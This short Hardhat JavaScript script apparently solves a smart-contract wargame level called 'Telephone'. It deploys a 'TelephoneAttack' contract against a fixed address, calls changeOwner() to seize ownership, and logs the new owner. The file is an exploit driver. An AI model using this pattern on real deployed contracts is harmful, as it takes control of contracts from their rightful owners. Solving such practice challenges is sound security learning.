const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async () => {
  const telephoneAddr = "0x8E93979A0a21334b3B6003067CB25ec03a4bc0bF";

  const telephone = await ethers.getContractAt("Telephone", telephoneAddr);
  const attackerFactory = await ethers.getContractFactory("TelephoneAttack");
  const attackerContract = await attackerFactory.deploy(telephoneAddr);
  await attackerContract.deployed();

  await attackerContract.changeOwner();

  //verify new owner
  console.log(`telephone owner is ${await telephone.owner()}`);
  console.log("* * * ");
});
